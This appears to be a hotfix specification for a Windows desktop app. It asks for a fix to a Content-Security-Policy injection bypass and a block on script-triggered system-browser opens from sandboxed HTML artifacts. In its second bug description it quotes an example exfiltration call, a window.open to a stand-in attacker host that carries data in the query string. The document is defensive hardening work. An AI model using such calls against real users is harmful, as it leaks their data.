# DESKTOP FIX — PHASE 6 HOTFIX: artifact CSP bypass + non-user-initiated external opens

Small, surgical fix in **SranDesktop** (Windows WPF, .NET 8). Two files plus tests. No other refactoring. Do not regress Phases 1–6 (all existing tests stay green; the Phase 6 artifact tests may gain assertions but must not be weakened).

## Bug 1 — `InjectCsp` can be bypassed by the artifact itself (security)

`SranDesktop/src/SranDesktop.Presentation/Rendering/ArtifactSandbox.cs:53` — the idempotency check is:

```csharp
if (html.Contains("Content-Security-Policy", StringComparison.OrdinalIgnoreCase))
    return html;
```

Two failure modes:
1. **Bypass:** a verbatim `<html>` artifact that ships its OWN permissive CSP meta (e.g. `content="default-src *; connect-src *"`) matches this check, so OUR locked-down CSP is never injected — and the navigation lock does not stop `fetch()`/XHR, so that artifact can make network requests again. This defeats the Phase 6 sandbox claim for exactly the attacker-controlled case that matters most.
2. **False positive:** an artifact that merely CONTAINS the string "Content-Security-Policy" (a code sample, an article about CSP) skips injection too.

### Fix

Make the idempotency check match ONLY our own tag, and rely on the browser's multiple-CSP semantics (when several policies are present, the browser enforces their **intersection** — an attacker's looser policy cannot relax ours):

```csharp
if (html.Contains(CspMetaTag(), StringComparison.Ordinal))
    return html; // already carries OUR exact meta — idempotent re-render
```

Everything else in `InjectCsp` (head-insert / synthesized-head / prepend) stays as-is. Update the doc comment: a document carrying a foreign CSP still gets ours injected, and the effective policy is the intersection.

### Tests (extend `ArtifactSandboxTests`)

- Verbatim HTML with its own permissive CSP meta → output contains BOTH metas, ours verbatim.
- HTML whose body text mentions "Content-Security-Policy" (no meta) → ours injected.
- Document already containing our exact `CspMetaTag()` → returned unchanged (idempotency preserved).
- Quick audit: confirm every `ArtifactHtmlBuilder`/`ArtifactViewModel` template path still ends up with exactly one of our metas (no double-inject in the generated-template cases, which embed the tag directly).

## Bug 2 — artifact JS can auto-open the user's real browser (hardening)

`SranDesktop/src/SranDesktop.Presentation/Controls/ArtifactControl.xaml.cs` — `OnNavigationStarting` / `OnNewWindowRequested` map `ArtifactSandbox.Decide(...) == OpenExternal` straight to `OpenInSystemBrowser`. Artifact JS calling `window.open("https://attacker.example/?d=" + data)` (or setting `location.href`) with NO user gesture therefore pops the system browser — a nuisance/phishing vector and a mild exfiltration channel via the query string.

### Fix

Only escalate to the system browser for **user-initiated** requests; everything else is denied silently:

- `OnNavigationStarting`: `OpenExternal` → `e.Cancel = true`, then `OpenInSystemBrowser` ONLY if `e.IsUserInitiated`.
- `OnNewWindowRequested`: `e.Handled = true` stays unconditional; `OpenInSystemBrowser` ONLY if `e.IsUserInitiated`.
- Log (Debug) the suppressed non-user-initiated attempts with the target host.

Keep `ArtifactSandbox.Decide` pure and unchanged (user-initiation is WebView2 event state, not URL policy) — but add a line to its doc comment noting the caller applies the user-gesture gate.

### Tests

The gate lives in event handlers on WebView2 event args (not constructible in unit tests). Extract the decision into a small pure function if trivial — e.g. `static bool ShouldOpenExternal(ArtifactNavigation decision, bool isUserInitiated)` in `ArtifactSandbox` — and test its 4 combinations; the handlers become one-liners over it.

## Final verification

1. `dotnet build` 0/0; `dotnet test` all green (new tests included; no existing assertion weakened).
2. Trace review: read the final `InjectCsp` + both handlers top-to-bottom and confirm (a) an attacker-supplied CSP can no longer suppress ours, (b) no path opens the system browser without a user gesture, (c) generated templates still carry exactly one CSP meta.
3. Summarize the change file by file — this is a hotfix, nothing else moves.
